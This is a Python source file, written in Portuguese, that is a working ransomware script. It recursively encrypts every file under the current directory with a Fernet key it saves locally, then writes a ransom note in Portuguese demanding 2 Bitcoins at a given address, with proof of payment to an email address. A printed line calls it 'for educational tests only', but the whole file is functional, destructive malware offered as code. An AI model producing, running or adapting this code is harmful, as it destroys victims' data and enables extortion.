from cryptography.fernet import Fernet
import os
import sys

def gerar_chave():
    """Gera e salva a chave de criptografia"""
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
    print("Chave gerada e salva em chave.key")

def carregar_chave():
    """Carrega a chave salva"""
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo, chave):
    """Criptografa um arquivo individual"""
    try:
        f = Fernet(chave)
        with open(arquivo, "rb") as file:
            dados = file.read()
        dados_encriptados = f.encrypt(dados)
        with open(arquivo, "wb") as file:
            file.write(dados_encriptados)
        return True
    except Exception as e:
        print(f"Erro ao criptografar {arquivo}: {e}")
        return False

def encontrar_arquivos(diretorio):
    """Encontra arquivos para criptografar"""
    lista = []
    arquivos_protegidos = ["ransoware.py", "LEIA ISSO.txt", "chave.key", "descriptografar.py"]
    
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome not in arquivos_protegidos:
                lista.append(caminho)
    return lista

def criar_mensagem_resgate():
    """Cria arquivo com instruções de resgate"""
    with open("LEIA ISSO.txt", "w", encoding="utf-8") as f:
        f.write("ATENÇÃO! SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!\n\n")
        f.write("Para recuperar seus arquivos:\n")
        f.write("1. Envie 2 Bitcoins para: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n")
        f.write("2. Envie o comprovante para: resgate@email.com\n")
        f.write("3. Após confirmação, enviaremos a chave de descriptografia\n\n")
        f.write("NÃO TENTE DESCRIPTOGRAFAR POR CONTA PRÓPRIA!\n")

def main():
    """Função principal"""
    print("Iniciando ransomware (APENAS PARA TESTES EDUCATIVOS)...")
    
    # Verificar se estamos no diretório correto
    diretorio_atual = os.getcwd()
    print(f"Diretório atual: {diretorio_atual}")
    
    # Gerar chave se não existir
    if not os.path.exists("chave.key"):
        gerar_chave()
    
    chave = carregar_chave()
    
    # Criptografar arquivos no diretório atual
    arquivos = encontrar_arquivos(".")
    
    if not arquivos:
        print("Nenhum arquivo encontrado para criptografar!")
        return
    
    print(f"Encontrados {len(arquivos)} arquivos para criptografar...")
    
    sucessos = 0
    for arquivo in arquivos:
        if criptografar_arquivo(arquivo, chave):
            sucessos += 1
            print(f"✓ {arquivo}")
    
    criar_mensagem_resgate()
    print(f"\nProcesso concluído! {sucessos}/{len(arquivos)} arquivos criptografados.")
    print("Arquivo 'LEIA ISSO.txt' criado com instruções.")

if __name__ == "__main__":
    main()